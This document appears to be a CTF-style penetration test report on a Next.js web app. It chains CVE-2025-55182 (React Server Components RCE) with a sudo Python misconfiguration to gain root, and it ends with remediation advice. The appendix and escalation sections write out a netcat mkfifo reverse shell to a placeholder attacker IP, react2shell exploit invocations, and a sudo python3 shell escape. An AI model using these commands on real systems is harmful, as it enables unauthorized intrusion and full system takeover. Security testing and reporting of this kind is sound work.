# Penetration Testing Report
## Romance and Co. Web Application

---

## Document Information
- **Report Title:** Penetration Testing Report - Romance and Co. Web Application
- **Date:** September 23, 2026
- **Target:** 10.48.156.122:3000
- **Engagement Type:** Authorized Security Assessment (CTF)
- **Report Status:** Final

---

## Executive Summary

### Overview
During this penetration test, a critical remote code execution (RCE) vulnerability was discovered in the React Server Components implementation, exploitable through malicious Flight protocol payloads without authentication or user interaction. This vulnerability, combined with overly permissive sudo configuration, enabled privilege escalation from the application user (daniel) to root access, resulting in complete system compromise.

An unauthenticated attacker can leverage this attack chain to execute arbitrary commands on the server, read and modify all files, establish persistent access, and fully control the target system with root privileges.

### Key Findings
- **Critical Vulnerabilities:** 1
  - CVE-2025-55182 (RCE via Flight Protocol)
- **High Severity:** 1
  - Privilege Escalation via Sudo Misconfiguration (requires prior RCE)

### Risk Rating
**Overall Risk Level: CRITICAL**

Unauthenticated attackers can completely compromise the target system with root 
access within minutes, affecting all users and data.

### Recommendation Summary
Immediately apply security patches to update React and Next.js to versions that remediate CVE-2025-55182, eliminating the primary attack vector. Simultaneously, audit and restrict sudo permissions for the daniel user by removing the ability to execute Python with the -c flag (inline code execution), preventing privilege escalation to root even if RCE is achieved.

---

## 1. Scope & Methodology

### Scope
**In Scope:**
- Target: 10.48.156.122
- Port: 3000 (HTTP Web Application)
- Application: Romance and Co. (Next.js web app)

### Testing Methodology
**Tools Used:**
- nmap (port scanning & service identification)
- gobuster (directory enumeration)
- nuclei (vulnerability scanning)
- react2shell (RCE exploitation)
- netcat (reverse shell access)

**Testing Phases:**
1. Reconnaissance - network mapping and endpoint discovery
2. Vulnerability Identification - automated and manual scanning
3. Exploitation - RCE delivery and command execution
4. Privilege Escalation - sudo permission abuse
5. Post-Exploitation - flag retrieval and documentation

---

## 2. Reconnaissance & Discovery

### Network Scanning
**Command:** `sudo nmap -sC -sV 10.48.156.122`

**Results:**
- Port 22: SSH
- Port 3000: HTTP (Next.js application)

### Web Application Enumeration
**Command:** `gobuster dir -u http://10.48.156.122:3000 -w /usr/share/wordlists/dirb/SecLists/Discovery/Web-Content/common.txt`

**Key Findings:**
- Majority of tested paths returned 404 (Not Found)
- No hidden administrative interfaces discovered
- Application primarily relies on homepage and advertised endpoints

**False Positives Identified:**
- /.git/logs: Returned 308 redirect (Next.js behavior, not actual git exposure)
- /render: Returned 308 redirect (framework routing, not vulnerable endpoint)
- /cgi-bin: Returned 308 redirect (framework routing, not vulnerable endpoint)

**Analysis:** Gobuster confirmed limited attack surface on traditional paths; vulnerability likely in application logic rather than misconfigured endpoints.

### Vulnerability Scanning
**Command:** `nuclei -u http://10.48.156.122:3000`

**Vulnerabilities Detected:**
- CVE-2025-55182 (React Server Components RCE)
- CVE-2025-55184 (DoS - not exploited)

---

## 3. Vulnerability Details

### Vulnerability 1: React Server Components Remote Code Execution
**CVE ID:** CVE-2025-55182

#### Description
React Server Components (RSCs) are a rendering architecture that allows components to execute exclusively on the server, reducing client-side JavaScript and improving performance. However, the Flight protocol used to serialize/deserialize RSC data contains a critical vulnerability: insecure deserialization of untrusted payloads. An attacker can craft a malicious Flight protocol message that, when deserialized by the server, executes arbitrary code without authentication or validation.

#### Technical Details
- **Affected Component:** Next.js React Server Components
- **Attack Vector:** Flight Protocol Deserialization
- **Authentication Required:** No
- **User Interaction:** No

#### CVSS v3.1 Score
**Score: 9.8 CRITICAL**

#### Impact
- **Confidentiality:** CRITICAL - All application data accessible to attacker
- **Integrity:** CRITICAL - Attacker can modify system files and application data
- **Availability:** CRITICAL - Attacker can destroy or disable the application

#### Proof of Concept (High-Level)
1. Identify React Server Components endpoint handling Flight protocol requests
2. Craft malicious Flight protocol payload targeting deserialization vulnerability
3. Deliver payload via react2shell automated exploitation tool
4. Execute arbitrary commands as application user (daniel)
5. Confirm code execution with basic commands (whoami, id, pwd)

#### Evidence of Exploitation
```
Shell: whoami
(http://10.48.156.122:3000) daniel

Shell: id
(http://10.48.156.122:3000) uid=100(daniel) gid=101(secgroup) groups=101(secgroup)

Shell: pwd
(http://10.48.156.122:3000) /app
```

---

### Vulnerability 2: Insufficient Sudo Restrictions
**Type:** Privilege Escalation / Improper Access Control

#### Description
The /etc/sudoers configuration explicitly grants the daniel user permission to execute Python 3 scripts as root without requiring a password (NOPASSWD directive). More critically, this permission includes the -c flag, which allows inline Python code execution. An attacker with initial RCE as daniel can leverage Python's os.system() function to spawn an interactive shell with root privileges, achieving complete system compromise in a single command: `sudo python3 -c 'import os; os.system("/bin/sh")'`

#### Technical Details
- **Affected Component:** /etc/sudoers configuration
- **Privilege Level:** Allows arbitrary Python execution as root
- **User Context:** daniel user

#### Impact
- **Confidentiality:** CRITICAL
- **Integrity:** CRITICAL
- **Availability:** CRITICAL

#### Proof of Concept (High-Level)
1. Check sudo permissions: `sudo -l -l`
2. Identified: Python 3 scripts executable as root without restrictions
3. Exploit: `sudo python3 -c 'import os; os.system("/bin/sh")'`
4. Escalate to root shell for flag retrieval

#### Evidence
```
Root access obtained → Root flag retrieved
```

---

## 4. Attack Chain / Timeline of Compromise

### Phase 1: Initial Reconnaissance (Minutes 0-15)
- Network scanning identified HTTP service on port 3000
- Web application identified as Next.js-based

### Phase 2: Endpoint Discovery (Minutes 15-45)
- Gobuster enumeration mapped application structure
- False positives identified (.git/logs, /render, /cgi-bin redirects)

### Phase 3: Vulnerability Identification (Minutes 45-60)
- Nuclei scanning detected CVE-2025-55182
- React Server Components RCE vulnerability confirmed

### Phase 4: Initial Access / RCE (Minutes 60-90)
- Deployed react2shell exploit tool
- Executed arbitrary commands as application user (daniel)
- Confirmed: whoami, id, pwd commands successful

### Phase 5: Reverse Shell (Minutes 90-120)
- Established mkfifo-based reverse shell via netcat
- Interactive shell access to target system
- **User flag retrieved** from daniel's home directory

### Phase 6: Privilege Escalation (Minutes 120-150)
- Enumerated sudo permissions with `sudo -l -l`
- Discovered Python 3 execution as root
- Executed Python shell escape: `sudo python3 -c 'import os; os.system("/bin/sh")'`
- **Root flag retrieved**

### Total Compromise Time: ~150 minutes

---

## 5. Impact Assessment

### Business Impact
Compromise of the Romance and Co. application allows attackers to access and steal all user data, including personal information, authentication credentials, and sensitive user-submitted content. This data breach would result in severe reputational damage, loss of customer trust, potential legal liability under data protection regulations (GDPR, etc.), and financial losses from customer churn and remediation costs. Additionally, attackers could modify application functionality, inject malicious content, or use the compromised infrastructure for further attacks against customers or partners.

### Technical Impact
- **Complete System Compromise:** Root-level access achieved
- **Data Confidentiality:** All files readable by attacker
- **System Integrity:** All files modifiable by attacker
- **Availability:** System could be destroyed or disabled

### Affected Assets
- User account database and authentication credentials
- Personal user information and relationship data
- Encrypted/sensitive user communications
- Application configuration files and secrets
- API keys and third-party service credentials
- System binaries and core services
- Backup and disaster recovery infrastructure
- Ability to pivot to other systems/services

---

## 6. Remediation Recommendations

### Priority 1: Critical (Immediate Action Required)

#### 1.1 Patch CVE-2025-55182
- **Action:** Update Next.js and React to patched versions
- **Timeline:** Within 24-48 hours
- **Details:** 
  - Update package.json dependencies
  - Run `npm audit fix`
  - Test application thoroughly before deployment

#### 1.2 Remediate Sudo Privilege Escalation
- **Action:** Restrict Python execution in sudoers
- **Timeline:** Immediate
- **Implementation:**
  - Remove blanket Python 3 sudo permissions
  - If Python required: whitelist specific scripts only
  - Remove `-c` flag capability
  - Example: `daniel ALL=(ALL) NOPASSWD: /usr/bin/python3 /opt/script.py` (not flexible -c)

---

### Priority 2: High (Short-term)

#### 2.1 Input Validation Framework
- **Action:** Implement strict input validation for all endpoints
- **Timeline:** 1-2 weeks
- **Details:**
  - Validate all Flight protocol messages
  - Implement deserialization whitelisting
  - Use schema validation (e.g., Zod, TypeScript strict mode)

#### 2.2 Sudo Audit
- **Action:** Review all sudoers entries
- **Timeline:** 1 week
- **Details:**
  - Remove unnecessary sudo permissions
  - Implement principle of least privilege
  - Monitor sudo usage with audit logging

---

### Priority 3: Medium (Long-term)

#### 3.1 Web Application Firewall (WAF)
- **Action:** Deploy WAF to detect malicious payloads
- **Timeline:** 2-4 weeks
- **Details:**
  - Implement rules for Flight protocol anomalies
  - Monitor for command injection patterns

#### 3.2 Security Scanning in CI/CD
- **Action:** Integrate automated security scanning
- **Timeline:** 1-2 weeks
- **Details:**
  - Add `npm audit` to build pipeline
  - Integrate SonarQube for SAST
  - Regular nuclei vulnerability scans

#### 3.3 Access Control
- **Action:** Implement mandatory authentication/authorization
- **Timeline:** 2-4 weeks
- **Details:**
  - Require authentication for sensitive endpoints
  - Implement role-based access control (RBAC)

---

## 7. Lessons Learned & Observations

### What Worked Well
- Systematic endpoint enumeration using gobuster
- Efficient vulnerability identification with nuclei
- Structured exploitation approach using react2shell

### Areas for Improvement
- Initial reconnaissance was manual and time-consuming before deploying automated tools
- Could have identified sudo misconfiguration earlier with more thorough privilege enumeration

### Tools Effectiveness
- **nmap:** Excellent for port discovery
- **gobuster:** Essential for systematic endpoint mapping
- **nuclei:** Quickly identified known CVEs
- **react2shell:** Effective RCE delivery mechanism

---

## 8. Conclusion

The Romance and Co. web application contains critical vulnerabilities that allow unauthenticated remote code execution and subsequent privilege escalation to root. Immediate patching of CVE-2025-55182 and remediation of sudo restrictions are essential to prevent system compromise.

**Risk Level:** CRITICAL - Immediate action required

---

## Appendix A: Command Reference

### Reconnaissance
```bash
sudo nmap -sC -sV 10.48.156.122
gobuster dir -u http://10.48.156.122:3000 -w /usr/share/wordlists/dirb/common.txt
nuclei -u http://10.48.156.122:3000
```

### Exploitation
```bash
python r2sae.py shell http://10.48.156.122:3000
python r2sae.py exec http://10.48.156.122:3000 -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc [attacker-ip] 9001 >/tmp/f"
sudo python3 -c 'import os; os.system("/bin/sh")'
```

---

## Appendix B: Vulnerability References
- CVE-2025-55182: https://nvd.nist.gov/vuln/detail/CVE-2025-55182
- CVE-2025-55184: https://nvd.nist.gov/vuln/detail/CVE-2025-55184
- Next.js Security: https://nextjs.org/docs/security
- Sudo Security Best Practices: https://www.sudo.ws/security/

---

**Report Prepared By:** Bishal Kumar Baishya 
**Date:** September 23, 2026
**Classification:** Internal Use